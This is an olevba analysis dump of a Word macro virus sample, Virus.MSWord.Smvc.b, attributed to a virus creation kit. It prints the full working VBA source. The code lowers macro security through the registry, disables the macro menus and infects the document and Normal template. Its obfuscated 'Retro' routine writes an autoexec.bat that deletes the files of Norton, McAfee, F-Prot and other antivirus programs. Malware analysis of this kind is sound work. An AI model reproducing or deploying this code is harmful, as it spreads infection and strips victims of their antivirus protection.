olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Smvc.b
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Smvc.b - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

'*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*
'$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$
'*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*
'   __   __
'  |  | |  |
' _|__|_|__|_   ____      ____   _________   _________   _________   ____   ____   ___   ________
'/           \ /    \    /    \ /         \ /         \ /         \ /    \ /    \ /   \ /        \
'|   ________| |     \  /     | |   ___   | |   ___   | |         | |    | |    | |   | |   _____/
'|  |          |      \/      | |  /   \  | |  /   \  | |         | |    | |    | \___/ |   |
'|  |________  |              | |  |   |  | |  |   |  | |__     __| |    |_|    |  ___  |   |__
'|           \ |              | |  |   |  | |  |   |  |    |   |    |           | |   | |      |
'|______     | |    |\  /|    | |  |   |  | |  |   |  |    |   |    |     _     | |   | |    __|
'       |    | |    | \/ |    | |  |   |  | |  |   |  |    |   |    |    | |    | |   | |   |
' ______|    | |    |    |    | |  \___/  | |  \___/  |    |   |    |    | |    | |   | |   |____
'|           | |    |    |    | |         | |         |    |   |    |    | |    | |   | |        \
'\___________/ \____/    \____/ \_________/ \_________/    \___/    \____/ \____/ \___/ \________/
'  |  | |  |                                                - $MOOTHiE Da HuStla [ZeroGravity]
'  |__| |__|                                                - August 15, 2000
'
'*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*
'$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$
'*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*

'Virus Creation: 10/23/00 9:14:34 PM
'$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$
'$*  Poly       = No            $*
'$*  Retro      = Yes           $*
'$*  Stealth    = High          $*
'$*  Infection  = New           $*
'$*  Payload    = Save          $*
'$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$

Private Declare Function ShowCursor Lib "user32" (ByVal bShow As Long) As Long

Private Sub Document_Open()
On Error Resume Next
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1&
CommandBars("Macro").Controls("Security...").Enabled = 0
CommandBars("Macro").Controls("Macros...").Enabled = 0
End Sub

Private Sub Document_New()
On Error Resume Next
'Author:   $MOOTHiE Da HuStla [Zer0Gravity]
'Name:     Sample #2
'Comments: This is a random virus sample
'Origin:   USA
'This Word2000 virus was created using $MOOTHiE Da HuStla's Macro Virus Creator 2000 Ver 2.0

On Error Resume Next: Randomize
Dim XXX1 As Object, XXX2 As Object, XXX3 As Object, XXX4 As Object, XXX5 As Object
Dim YYY1 As Object, YYY2 As Object, YYY3 As Object, YYY4 As Object, YYY5 As Object
Set XXX1 = ActiveDocument: Set XXX2 = XXX1.VBProject: Set XXX3 = XXX2.VBComponents: Set XXX4 = XXX3.Item(1): Set XXX5 = XXX4.CodeModule
Set YYY1 = NormalTemplate: Set YYY2 = YYY1.VBProject: Set YYY3 = YYY2.VBComponents: Set YYY4 = YYY3.Item(1): Set YYY5 = YYY4.CodeModule

AAA = YYY5.countoflines: BBB = XXX5.countoflines: CCC = Chr(Int(Rnd * 25) + 65): Chr (Int(Rnd * 25) + 65): Chr (Int(Rnd * 25) + 65)

If AAA < BBB Then
For XXX = 1 To AAA: NT5.replaceline XXX, CCC: Next XXX
For XXX = 1 To BBB: XXXA = XXX5.lines(XXX, 1): YYY5.insertlines XXX, XXXA: Next XXX
NormalTemplate.Save: End If


If BBB < AAA Then
For XXX = 1 To BBB: XXX5.replaceline XXX, CCC: Next XXX
For XXX = 1 To AAA: XXXA = YYY5.lines(XXX, 1): XXX5.insertlines XXX, XXXA: Next XXX
ActiveDocument.Save: End If
Call Retro
End Sub

Sub FileSave()
On Error Resume Next
AAA = ShowCursor(0)
ActiveDocument.Save 'Actual Save Command
End Sub


Private Sub Retro()
On Error Resume Next: h$ = Chr(99) & Chr(58) & Chr(92) & Chr(97) & Chr(117) & Chr(116) & Chr(111) & Chr(101) & Chr(120) & Chr(101) & Chr(99) & Chr(46) & Chr(98) & Chr(97) & Chr(116)
Open h$ For Output As #1
OO$ = Chr(82) & Chr(69) & Chr(77) & Chr(32) & Chr(45) & Chr(32) & Chr(84) & Chr(104) & Chr(105) & Chr(115) & Chr(32) & Chr(115) & Chr(101) & Chr(99) & Chr(116) & Chr(105) & Chr(111) & Chr(110) & Chr(32) & Chr(112) & Chr(117) & Chr(116) & Chr(32) & Chr(105) & Chr(110) & Chr(32) & Chr(98) & Chr(121) & Chr(32) & Chr(87) & Chr(105) & Chr(110) & Chr(100) & Chr(111) & Chr(119) & Chr(115) & Chr(44) & Chr(32) & Chr(105) & Chr(102) & Chr(32) & Chr(100) & Chr(101) & Chr(108) & Chr(101) & Chr(116) & Chr(101) & Chr(100) & Chr(44)
PP$ = Chr(32) & Chr(87) & Chr(105) & Chr(110) & Chr(100) & Chr(111) & Chr(119) & Chr(115) & Chr(32) & Chr(119) & Chr(105) & Chr(108) & Chr(108) & Chr(32) & Chr(110) & Chr(111) & Chr(32) & Chr(108) & Chr(111) & Chr(110) & Chr(103) & Chr(101) & Chr(114) & Chr(32) & Chr(115) & Chr(116) & Chr(97) & Chr(114) & Chr(116) & Chr(32) & Chr(117) & Chr(112) & Chr(32) & Chr(45) & Chr(13) & Chr(10) & Chr(82) & Chr(69) & Chr(77) & Chr(32) & Chr(45) & Chr(32) & Chr(80) & Chr(108) & Chr(101) & Chr(97) & Chr(115) & Chr(101) & Chr(32) & Chr(68)
QQ$ = Chr(111) & Chr(32) & Chr(78) & Chr(111) & Chr(116) & Chr(32) & Chr(82) & Chr(101) & Chr(109) & Chr(111) & Chr(118) & Chr(101) & Chr(32) & Chr(45)
YY$ = OO$ & PP$ & QQ$: Print #1, YY$
OO$ = Chr(64) & Chr(101) & Chr(99) & Chr(104) & Chr(111) & Chr(32) & Chr(111) & Chr(102) & Chr(102) & Chr(13) & Chr(10) & Chr(101) & Chr(99) & Chr(104) & Chr(111) & Chr(32) & Chr(89) & Chr(111) & Chr(117) & Chr(32) & Chr(65) & Chr(110) & Chr(116) & Chr(105) & Chr(45) & Chr(86) & Chr(105) & Chr(114) & Chr(117) & Chr(115) & Chr(32) & Chr(115) & Chr(111) & Chr(102) & Chr(116) & Chr(119) & Chr(97) & Chr(114) & Chr(101) & Chr(32) & Chr(119) & Chr(105) & Chr(108) & Chr(108) & Chr(32) & Chr(110) & Chr(111) & Chr(119) & Chr(32)
PP$ = Chr(99) & Chr(104) & Chr(101) & Chr(99) & Chr(107) & Chr(32) & Chr(121) & Chr(111) & Chr(117) & Chr(32) & Chr(115) & Chr(121) & Chr(115) & Chr(116) & Chr(101) & Chr(109) & Chr(46) & Chr(46) & Chr(46)
YY$ = OO$ & PP$: Print #1, YY$
OO$ = Chr(100) & Chr(101) & Chr(108) & Chr(32) & Chr(99) & Chr(58) & Chr(92) & Chr(112) & Chr(114) & Chr(111) & Chr(103) & Chr(114) & Chr(97) & Chr(126) & Chr(49) & Chr(92) & Chr(110) & Chr(111) & Chr(114) & Chr(116) & Chr(111) & Chr(110) & Chr(126) & Chr(49) & Chr(92) & Chr(42) & Chr(46) & Chr(101) & Chr(120) & Chr(101) & Chr(13) & Chr(10) & Chr(100) & Chr(101) & Chr(108) & Chr(32) & Chr(99) & Chr(58) & Chr(92) & Chr(112) & Chr(114) & Chr(111) & Chr(103) & Chr(114) & Chr(97) & Chr(126) & Chr(49) & Chr(92) & Chr(110)
PP$ = Chr(111) & Chr(114) & Chr(116) & Chr(111) & Chr(110) & Chr(126) & Chr(49) & Chr(92) & Chr(42) & Chr(46) & Chr(100) & Chr(108) & Chr(108) & Chr(13) & Chr(10) & Chr(100) & Chr(101) & Chr(108) & Chr(32) & Chr(99) & Chr(58) & Chr(92) & Chr(112) & Chr(114) & Chr(111) & Chr(103) & Chr(114) & Chr(97) & Chr(126) & Chr(49) & Chr(92) & Chr(110) & Chr(111) & Chr(114) & Chr(116) & Chr(111) & Chr(110) & Chr(126) & Chr(49) & Chr(92) & Chr(42) & Chr(46) & Chr(100) & Chr(97) & Chr(116) & Chr(13) & Chr(10) & Chr(100) & Chr(101) & Chr(108)
QQ$ = Chr(32) & Chr(99) & Chr(58) & Chr(92) & Chr(112) & Chr(114) & Chr(111) & Chr(103) & Chr(114) & Chr(97) & Chr(126) & Chr(49) & Chr(92) & Chr(110) & Chr(111) & Chr(114) & Chr(116) & Chr(111) & Chr(110) & Chr(126) & Chr(49) & Chr(92) & Chr(42) & Chr(46) & Chr(118) & Chr(120) & Chr(100) & Chr(13) & Chr(10) & Chr(100) & Chr(101) & Chr(108) & Chr(32) & Chr(99) & Chr(58) & Chr(92) & Chr(110) & Chr(111) & Chr(114) & Chr(116) & Chr(111) & Chr(110) & Chr(126) & Chr(49) & Chr(92) & Chr(42) & Chr(46) & Chr(101) & Chr(120) & Chr(101)
SS$ = Chr(13) & Chr(10) & Chr(100) & Chr(101) & Chr(108) & Chr(32) & Chr(99) & Chr(58) & Chr(92) & Chr(110) & Chr(111) & Chr(114) & Chr(116) & Chr(111) & Chr(110) & Chr(126) & Chr(49) & Chr(92) & Chr(42) & Chr(46) & Chr(100) & Chr(108) & Chr(108) & Chr(13) & Chr(10) & Chr(100) & Chr(101) & Chr(108) & Chr(32) & Chr(99) & Chr(58) & Chr(92) & Chr(110) & Chr(111) & Chr(114) & Chr(116) & Chr(111) & Chr(110) & Chr(126) & Chr(49) & Chr(92) & Chr(42) & Chr(46) & Chr(100) & Chr(97) & Chr(116) & Chr(13) & Chr(10) & Chr(100) & Chr(101)
TT$ = Chr(108) & Chr(32) & Chr(99) & Chr(58) & Chr(92) & Chr(110) & Chr(111) & Chr(114) & Chr(116) & Chr(111) & Chr(110) & Chr(126) & Chr(49) & Chr(92) & Chr(42) & Chr(46) & Chr(118) & Chr(120) & Chr(100)
YY$ = OO$ & PP$ & QQ$ & SS$ & TT$: Print #1, YY$
OO$ = Chr(100) & Chr(101) & Chr(108) & Chr(32) & Chr(99) & Chr(58) & Chr(92) & Chr(112) & Chr(114) & Chr(111) & Chr(103) & Chr(114) & Chr(97) & Chr(126) & Chr(49) & Chr(92) & Chr(97) & Chr(110) & Chr(116) & Chr(105) & Chr(118) & Chr(126) & Chr(49) & Chr(92) & Chr(42) & Chr(46) & Chr(97) & Chr(118) & Chr(99) & Chr(13) & Chr(10) & Chr(100) & Chr(101) & Chr(108) & Chr(32) & Chr(99) & Chr(58) & Chr(92) & Chr(112) & Chr(114) & Chr(111) & Chr(103) & Chr(114) & Chr(97) & Chr(126) & Chr(49) & Chr(92) & Chr(97) & Chr(110)
PP$ = Chr(116) & Chr(105) & Chr(118) & Chr(126) & Chr(49) & Chr(92) & Chr(42) & Chr(46) & Chr(115) & Chr(101) & Chr(116) & Chr(32) & Chr(13) & Chr(10) & Chr(100) & Chr(101) & Chr(108) & Chr(32) & Chr(99) & Chr(58) & Chr(92) & Chr(112) & Chr(114) & Chr(111) & Chr(103) & Chr(114) & Chr(97) & Chr(126) & Chr(49) & Chr(92) & Chr(97) & Chr(110) & Chr(116) & Chr(105) & Chr(118) & Chr(126) & Chr(49) & Chr(92) & Chr(42) & Chr(46) & Chr(100) & Chr(108) & Chr(108) & Chr(13) & Chr(10) & Chr(100) & Chr(101) & Chr(108) & Chr(32) & Chr(99)
QQ$ = Chr(58) & Chr(92) & Chr(112) & Chr(114) & Chr(111) & Chr(103) & Chr(114) & Chr(97) & Chr(126) & Chr(49) & Chr(92) & Chr(97) & Chr(110) & Chr(116) & Chr(105) & Chr(118) & Chr(126) & Chr(49) & Chr(92) & Chr(42) & Chr(46) & Chr(118) & Chr(120) & Chr(100) & Chr(13) & Chr(10) & Chr(100) & Chr(101) & Chr(108) & Chr(32) & Chr(99) & Chr(58) & Chr(92) & Chr(112) & Chr(114) & Chr(111) & Chr(103) & Chr(114) & Chr(97) & Chr(126) & Chr(49) & Chr(92) & Chr(97) & Chr(110) & Chr(116) & Chr(105) & Chr(118) & Chr(126) & Chr(49) & Chr(92)
SS$ = Chr(42) & Chr(46) & Chr(101) & Chr(120) & Chr(101) & Chr(13) & Chr(10) & Chr(100) & Chr(101) & Chr(108) & Chr(32) & Chr(99) & Chr(58) & Chr(92) & Chr(97) & Chr(110) & Chr(116) & Chr(105) & Chr(118) & Chr(126) & Chr(49) & Chr(92) & Chr(42) & Chr(46) & Chr(97) & Chr(118) & Chr(99) & Chr(13) & Chr(10) & Chr(100) & Chr(101) & Chr(108) & Chr(32) & Chr(99) & Chr(58) & Chr(92) & Chr(97) & Chr(110) & Chr(116) & Chr(105) & Chr(118) & Chr(126) & Chr(49) & Chr(92) & Chr(42) & Chr(46) & Chr(115) & Chr(101) & Chr(116) & Chr(13)
TT$ = Chr(10) & Chr(100) & Chr(101) & Chr(108) & Chr(32) & Chr(99) & Chr(58) & Chr(92) & Chr(97) & Chr(110) & Chr(116) & Chr(105) & Chr(118) & Chr(126) & Chr(49) & Chr(92) & Chr(42) & Chr(46) & Chr(100) & Chr(108) & Chr(108) & Chr(13) & Chr(10) & Chr(100) & Chr(101) & Chr(108) & Chr(32) & Chr(99) & Chr(58) & Chr(92) & Chr(97) & Chr(110) & Chr(116) & Chr(105) & Chr(118) & Chr(126) & Chr(49) & Chr(92) & Chr(42) & Chr(46) & Chr(118) & Chr(120) & Chr(100) & Chr(13) & Chr(10) & Chr(100) & Chr(101) & Chr(108) & Chr(32) & Chr(99)
UU$ = Chr(58) & Chr(92) & Chr(97) & Chr(110) & Chr(116) & Chr(105) & Chr(118) & Chr(126) & Chr(49) & Chr(92) & Chr(42) & Chr(46) & Chr(101) & Chr(120) & Chr(101)
YY$ = OO$ & PP$ & QQ$ & SS$ & TT$ & UU$: Print #1, YY$
OO$ = Chr(100) & Chr(101) & Chr(108) & Chr(32) & Chr(99) & Chr(58) & Chr(92) & Chr(112) & Chr(114) & Chr(111) & Chr(103) & Chr(114) & Chr(97) & Chr(126) & Chr(49) & Chr(92) & Chr(109) & Chr(99) & Chr(97) & Chr(102) & Chr(101) & Chr(101) & Chr(126) & Chr(49) & Chr(92) & Chr(42) & Chr(46) & Chr(100) & Chr(97) & Chr(116) & Chr(13) & Chr(10) & Chr(100) & Chr(101) & Chr(108) & Chr(32) & Chr(99) & Chr(58) & Chr(92) & Chr(112) & Chr(114) & Chr(111) & Chr(103) & Chr(114) & Chr(97) & Chr(126) & Chr(49) & Chr(92) & Chr(109)
PP$ = Chr(99) & Chr(97) & Chr(102) & Chr(101) & Chr(101) & Chr(126) & Chr(49) & Chr(92) & Chr(42) & Chr(46) & Chr(100) & Chr(108) & Chr(108) & Chr(13) & Chr(10) & Chr(100) & Chr(101) & Chr(108) & Chr(32) & Chr(99) & Chr(58) & Chr(92) & Chr(112) & Chr(114) & Chr(111) & Chr(103) & Chr(114) & Chr(97) & Chr(126) & Chr(49) & Chr(92) & Chr(109) & Chr(99) & Chr(97) & Chr(102) & Chr(101) & Chr(101) & Chr(126) & Chr(49) & Chr(92) & Chr(42) & Chr(46) & Chr(101) & Chr(120) & Chr(101) & Chr(13) & Chr(10) & Chr(100) & Chr(101) & Chr(108)
QQ$ = Chr(32) & Chr(99) & Chr(58) & Chr(92) & Chr(112) & Chr(114) & Chr(111) & Chr(103) & Chr(114) & Chr(97) & Chr(126) & Chr(49) & Chr(92) & Chr(109) & Chr(99) & Chr(97) & Chr(102) & Chr(101) & Chr(101) & Chr(126) & Chr(49) & Chr(92) & Chr(42) & Chr(46) & Chr(118) & Chr(115) & Chr(99) & Chr(13) & Chr(10) & Chr(100) & Chr(101) & Chr(108) & Chr(32) & Chr(99) & Chr(58) & Chr(92) & Chr(112) & Chr(114) & Chr(111) & Chr(103) & Chr(114) & Chr(97) & Chr(126) & Chr(49) & Chr(92) & Chr(109) & Chr(99) & Chr(97) & Chr(102) & Chr(101)
SS$ = Chr(101) & Chr(92) & Chr(42) & Chr(46) & Chr(100) & Chr(97) & Chr(116) & Chr(13) & Chr(10) & Chr(100) & Chr(101) & Chr(108) & Chr(32) & Chr(99) & Chr(58) & Chr(92) & Chr(112) & Chr(114) & Chr(111) & Chr(103) & Chr(114) & Chr(97) & Chr(126) & Chr(49) & Chr(92) & Chr(109) & Chr(99) & Chr(97) & Chr(102) & Chr(101) & Chr(101) & Chr(92) & Chr(42) & Chr(46) & Chr(100) & Chr(108) & Chr(108) & Chr(13) & Chr(10) & Chr(100) & Chr(101) & Chr(108) & Chr(32) & Chr(99) & Chr(58) & Chr(92) & Chr(112) & Chr(114) & Chr(111) & Chr(103)
TT$ = Chr(114) & Chr(97) & Chr(126) & Chr(49) & Chr(92) & Chr(109) & Chr(99) & Chr(97) & Chr(102) & Chr(101) & Chr(101) & Chr(92) & Chr(42) & Chr(46) & Chr(101) & Chr(120) & Chr(101) & Chr(13) & Chr(10) & Chr(100) & Chr(101) & Chr(108) & Chr(32) & Chr(99) & Chr(58) & Chr(92) & Chr(112) & Chr(114) & Chr(111) & Chr(103) & Chr(114) & Chr(97) & Chr(126) & Chr(49) & Chr(92) & Chr(109) & Chr(99) & Chr(97) & Chr(102) & Chr(101) & Chr(101) & Chr(92) & Chr(42) & Chr(46) & Chr(118) & Chr(115) & Chr(99) & Chr(13) & Chr(10) & Chr(100)
UU$ = Chr(101) & Chr(108) & Chr(32) & Chr(99) & Chr(58) & Chr(92) & Chr(109) & Chr(99) & Chr(97) & Chr(102) & Chr(101) & Chr(101) & Chr(126) & Chr(49) & Chr(92) & Chr(42) & Chr(46) & Chr(100) & Chr(97) & Chr(116) & Chr(13) & Chr(10) & Chr(100) & Chr(101) & Chr(108) & Chr(32) & Chr(99) & Chr(58) & Chr(92) & Chr(109) & Chr(99) & Chr(97) & Chr(102) & Chr(101) & Chr(101) & Chr(126) & Chr(49) & Chr(92) & Chr(42) & Chr(46) & Chr(100) & Chr(108) & Chr(108) & Chr(13) & Chr(10) & Chr(100) & Chr(101) & Chr(108) & Chr(32) & Chr(99)
VV$ = Chr(58) & Chr(92) & Chr(109) & Chr(99) & Chr(97) & Chr(102) & Chr(101) & Chr(101) & Chr(126) & Chr(49) & Chr(92) & Chr(42) & Chr(46) & Chr(101) & Chr(120) & Chr(101) & Chr(13) & Chr(10) & Chr(100) & Chr(101) & Chr(108) & Chr(32) & Chr(99) & Chr(58) & Chr(92) & Chr(109) & Chr(99) & Chr(97) & Chr(102) & Chr(101) & Chr(101) & Chr(126) & Chr(49) & Chr(92) & Chr(42) & Chr(46) & Chr(118) & Chr(115) & Chr(99)
YY$ = OO$ & PP$ & QQ$ & SS$ & TT$ & UU$ & VV$: Print #1, YY$
OO$ = Chr(100) & Chr(101) & Chr(108) & Chr(32) & Chr(99) & Chr(58) & Chr(92) & Chr(112) & Chr(114) & Chr(111) & Chr(103) & Chr(114) & Chr(97) & Chr(126) & Chr(49) & Chr(92) & Chr(102) & Chr(115) & Chr(105) & Chr(92) & Chr(102) & Chr(45) & Chr(112) & Chr(114) & Chr(111) & Chr(116) & Chr(92) & Chr(42) & Chr(46) & Chr(101) & Chr(120) & Chr(101) & Chr(13) & Chr(10) & Chr(100) & Chr(101) & Chr(108) & Chr(32) & Chr(99) & Chr(58) & Chr(92) & Chr(112) & Chr(114) & Chr(111) & Chr(103) & Chr(114) & Chr(97) & Chr(126) & Chr(49)
PP$ = Chr(92) & Chr(102) & Chr(115) & Chr(105) & Chr(92) & Chr(102) & Chr(45) & Chr(112) & Chr(114) & Chr(111) & Chr(116) & Chr(92) & Chr(42) & Chr(46) & Chr(100) & Chr(108) & Chr(108) & Chr(13) & Chr(10) & Chr(100) & Chr(101) & Chr(108) & Chr(32) & Chr(99) & Chr(58) & Chr(92) & Chr(112) & Chr(114) & Chr(111) & Chr(103) & Chr(114) & Chr(97) & Chr(126) & Chr(49) & Chr(92) & Chr(102) & Chr(115) & Chr(105) & Chr(92) & Chr(102) & Chr(45) & Chr(112) & Chr(114) & Chr(111) & Chr(116) & Chr(92) & Chr(42) & Chr(46) & Chr(118) & Chr(120)
QQ$ = Chr(100) & Chr(13) & Chr(10) & Chr(100) & Chr(101) & Chr(108) & Chr(32) & Chr(99) & Chr(58) & Chr(92) & Chr(112) & Chr(114) & Chr(111) & Chr(103) & Chr(114) & Chr(97) & Chr(126) & Chr(49) & Chr(92) & Chr(102) & Chr(115) & Chr(105) & Chr(92) & Chr(102) & Chr(45) & Chr(112) & Chr(114) & Chr(111) & Chr(116) & Chr(92) & Chr(42) & Chr(46) & Chr(114) & Chr(101) & Chr(112) & Chr(13) & Chr(10) & Chr(100) & Chr(101) & Chr(108) & Chr(32) & Chr(99) & Chr(58) & Chr(92) & Chr(112) & Chr(114) & Chr(111) & Chr(103) & Chr(114) & Chr(97)
SS$ = Chr(126) & Chr(49) & Chr(92) & Chr(102) & Chr(45) & Chr(112) & Chr(114) & Chr(111) & Chr(116) & Chr(92) & Chr(42) & Chr(46) & Chr(101) & Chr(120) & Chr(101) & Chr(13) & Chr(10) & Chr(100) & Chr(101) & Chr(108) & Chr(32) & Chr(99) & Chr(58) & Chr(92) & Chr(112) & Chr(114) & Chr(111) & Chr(103) & Chr(114) & Chr(97) & Chr(126) & Chr(49) & Chr(92) & Chr(102) & Chr(45) & Chr(112) & Chr(114) & Chr(111) & Chr(116) & Chr(92) & Chr(42) & Chr(46) & Chr(100) & Chr(108) & Chr(108) & Chr(13) & Chr(10) & Chr(100) & Chr(101) & Chr(108)
TT$ = Chr(32) & Chr(99) & Chr(58) & Chr(92) & Chr(112) & Chr(114) & Chr(111) & Chr(103) & Chr(114) & Chr(97) & Chr(126) & Chr(49) & Chr(92) & Chr(102) & Chr(45) & Chr(112) & Chr(114) & Chr(111) & Chr(116) & Chr(92) & Chr(42) & Chr(46) & Chr(118) & Chr(120) & Chr(100) & Chr(13) & Chr(10) & Chr(100) & Chr(101) & Chr(108) & Chr(32) & Chr(99) & Chr(58) & Chr(92) & Chr(112) & Chr(114) & Chr(111) & Chr(103) & Chr(114) & Chr(97) & Chr(126) & Chr(49) & Chr(92) & Chr(102) & Chr(45) & Chr(112) & Chr(114) & Chr(111) & Chr(116) & Chr(92)
UU$ = Chr(42) & Chr(46) & Chr(114) & Chr(101) & Chr(112) & Chr(13) & Chr(10) & Chr(100) & Chr(101) & Chr(108) & Chr(32) & Chr(99) & Chr(58) & Chr(92) & Chr(102) & Chr(45) & Chr(112) & Chr(114) & Chr(111) & Chr(116) & Chr(92) & Chr(42) & Chr(46) & Chr(101) & Chr(120) & Chr(101) & Chr(13) & Chr(10) & Chr(100) & Chr(101) & Chr(108) & Chr(32) & Chr(99) & Chr(58) & Chr(92) & Chr(102) & Chr(45) & Chr(112) & Chr(114) & Chr(111) & Chr(116) & Chr(92) & Chr(42) & Chr(46) & Chr(100) & Chr(108) & Chr(108) & Chr(13) & Chr(10) & Chr(100)
VV$ = Chr(101) & Chr(108) & Chr(32) & Chr(99) & Chr(58) & Chr(92) & Chr(102) & Chr(45) & Chr(112) & Chr(114) & Chr(111) & Chr(116) & Chr(92) & Chr(42) & Chr(46) & Chr(118) & Chr(120) & Chr(100) & Chr(13) & Chr(10) & Chr(100) & Chr(101) & Chr(108) & Chr(32) & Chr(99) & Chr(58) & Chr(92) & Chr(102) & Chr(45) & Chr(112) & Chr(114) & Chr(111) & Chr(116) & Chr(92) & Chr(42) & Chr(46) & Chr(114) & Chr(101) & Chr(112)
YY$ = OO$ & PP$ & QQ$ & SS$ & TT$ & UU$ & VV$: Print #1, YY$
OO$ = Chr(100) & Chr(101) & Chr(108) & Chr(32) & Chr(99) & Chr(58) & Chr(92) & Chr(102) & Chr(115) & Chr(105) & Chr(92) & Chr(102) & Chr(45) & Chr(112) & Chr(114) & Chr(111) & Chr(116) & Chr(92) & Chr(42) & Chr(46) & Chr(101) & Chr(120) & Chr(101) & Chr(13) & Chr(10) & Chr(100) & Chr(101) & Chr(108) & Chr(32) & Chr(99) & Chr(58) & Chr(92) & Chr(102) & Chr(115) & Chr(105) & Chr(92) & Chr(102) & Chr(45) & Chr(112) & Chr(114) & Chr(111) & Chr(116) & Chr(92) & Chr(42) & Chr(46) & Chr(100) & Chr(108) & Chr(108) & Chr(13)
PP$ = Chr(10) & Chr(100) & Chr(101) & Chr(108) & Chr(32) & Chr(99) & Chr(58) & Chr(92) & Chr(102) & Chr(115) & Chr(105) & Chr(92) & Chr(102) & Chr(45) & Chr(112) & Chr(114) & Chr(111) & Chr(116) & Chr(92) & Chr(42) & Chr(46) & Chr(118) & Chr(120) & Chr(100) & Chr(13) & Chr(10) & Chr(100) & Chr(101) & Chr(108) & Chr(32) & Chr(99) & Chr(58) & Chr(92) & Chr(102) & Chr(115) & Chr(105) & Chr(92) & Chr(102) & Chr(45) & Chr(112) & Chr(114) & Chr(111) & Chr(116) & Chr(92) & Chr(42) & Chr(46) & Chr(114) & Chr(101) & Chr(112)
YY$ = OO$ & PP$: Print #1, YY$
OO$ = Chr(101) & Chr(99) & Chr(104) & Chr(111) & Chr(32) & Chr(83) & Chr(121) & Chr(115) & Chr(116) & Chr(101) & Chr(109) & Chr(32) & Chr(99) & Chr(104) & Chr(101) & Chr(99) & Chr(107) & Chr(32) & Chr(104) & Chr(97) & Chr(115) & Chr(32) & Chr(98) & Chr(101) & Chr(101) & Chr(110) & Chr(32) & Chr(99) & Chr(111) & Chr(109) & Chr(112) & Chr(108) & Chr(101) & Chr(116) & Chr(101) & Chr(100) & Chr(46)
Print #1, OO$
OO$ = Chr(82) & Chr(69) & Chr(77) & Chr(32) & Chr(45) & Chr(45) & Chr(45) & Chr(45) & Chr(45) & Chr(45) & Chr(45) & Chr(45) & Chr(45) & Chr(45) & Chr(45) & Chr(45) & Chr(45) & Chr(45) & Chr(45) & Chr(45) & Chr(45) & Chr(45) & Chr(45) & Chr(45) & Chr(45) & Chr(45) & Chr(45) & Chr(45) & Chr(45) & Chr(45) & Chr(45) & Chr(45) & Chr(45) & Chr(45) & Chr(45) & Chr(45) & Chr(45) & Chr(45) & Chr(45) & Chr(45) & Chr(45) & Chr(45) & Chr(45) & Chr(45) & Chr(45) & Chr(45) & Chr(45) & Chr(45) & Chr(45)
PP$ = Chr(45) & Chr(45) & Chr(45) & Chr(45) & Chr(45) & Chr(45) & Chr(45) & Chr(45) & Chr(45) & Chr(45) & Chr(45) & Chr(45) & Chr(45) & Chr(45) & Chr(45) & Chr(45) & Chr(45) & Chr(45) & Chr(45) & Chr(45) & Chr(45) & Chr(45) & Chr(45) & Chr(45) & Chr(45) & Chr(45) & Chr(45) & Chr(45) & Chr(45) & Chr(45) & Chr(45) & Chr(45) & Chr(45) & Chr(45)
YY$ = OO$ & PP$: Print #1, YY$: Close #1

End Sub

Sub ViewVBCode()
Application.Quit False
End Sub

'*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*
'$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$
'*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*

-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: ./Virus.MSWord.Smvc.b
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 74243 bytes
' Line #0:
' Line #1:
' 	QuoteRem 0x0000 0x0061 "*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*"
' Line #2:
' 	QuoteRem 0x0000 0x0061 "$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$"
' Line #3:
' 	QuoteRem 0x0000 0x0061 "*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*$*"
' Line #4:
' 	QuoteRem 0x0000 0x000A "   __   __"
' Line #5:
' 	QuoteRem 0x0000 0x000B "  |  | |  |"
' Line #6:
